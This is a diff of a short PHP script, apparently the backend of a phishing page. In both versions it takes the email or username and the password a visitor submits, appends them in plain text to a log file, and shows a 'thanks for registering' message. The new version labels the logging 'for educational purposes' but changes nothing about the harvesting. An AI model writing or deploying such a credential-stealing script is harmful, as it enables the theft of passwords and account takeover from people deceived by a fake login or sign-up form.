@@ -1,23 +1,18 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Capture the username and password from the form
-    $username = $_POST['username'];
+    $email = $_POST['email'];
     $password = $_POST['password'];
-
-    // Open the file in append mode
+    
+    // Log the captured data (for educational purposes)
     $file = fopen("log.txt", "a");
-
-    // Write the username and password to the file
-    // Format: Username: [username], Password: [password], Timestamp: [timestamp]
-    $log_entry = "Username: $username, Password: $password, Timestamp: " . date("Y-m-d H:i:s") . "\n";
-    fwrite($file, $log_entry);
-
-    // Close the file
+    fwrite($file, "Email: $email | Password: $password\n");
     fclose($file);
+    
+    // echo "Login failed. Please try again.";
 
-    // Notify the user
-    echo "<h1>thanks for registering.</h1>";
-} else {
-    echo "<h1>Invalid request method.</h1>";
-}
+?>
+
+<h1>thanks for registering</h1>
+
+<?php
+
 ?>
